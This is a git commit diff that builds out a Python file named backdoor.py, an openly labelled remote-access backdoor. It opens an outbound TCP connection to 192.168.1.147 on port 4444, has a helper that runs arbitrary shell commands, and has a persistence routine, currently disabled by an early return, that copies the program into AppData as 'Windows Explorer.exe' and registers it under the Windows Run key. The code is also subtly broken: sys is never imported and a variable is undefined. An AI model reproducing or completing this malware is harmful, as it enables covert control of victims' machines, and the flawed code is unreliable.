4fdff89046dac4d457f55ffb333b6be46dc379b8
AlexanderOMT <oscar_martin2001@hotmail.com>
2022-12-24 18:14:00 +0100

    v0.15 >> Testing backdoor

--- backdoor.py
+++ backdoor.py
@@ -1,14 +1,54 @@
-import socket
+#!/usr/bin/env python
 
+import socket
+import os
+import shutil
+import subprocess
 
 class Backdoor:
-    def __init__(self, client, listener):
+    def __init__(self, host, listener):
 
-        connection = socket.socket(
+        self.connection = socket.socket(
             socket.AF_INET,     # IPv4
             socket.SOCK_STREAM, # TCP socket
         )
              
-        connection.connect(client, listener)
+        self.connection.connect( (host, listener) )
+    
+    def run(self):
+        while True:    
+            try:
+                with self.connection as s:
+                    sys.stdout.write(f'\r[*] Connected to {host} ...')
+                    s.sendall(b"Hi, this is a test server")
+
+                    while True:
+                        data = s.recv(1024)
+                        if not data:
+                            break
+                        sys.stdout.write(f'\r\n[+] Received: {data}\n')
+                        s.send(data)
+            except Exception:
+                sys.stdout.write('\x1b[2K')
+                sys.stdout.write(f'\r[*] Waiting for connection ...')
+
+    def become_persistent(self):
+
+        return None
+
+        location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(location):
+            shutil.copyfile(src = sys.executable, dst = location)
+            subprocess.call(
+                f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d {location}',
+                shell = True,
+            )
+
+    def execute_command(self, command):
+        return subprocess.check_output(command, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, shell=True)
+
+
+beautiful_door = Backdoor( '192.168.1.147', 4444 )
+beautiful_door.run()
 
 
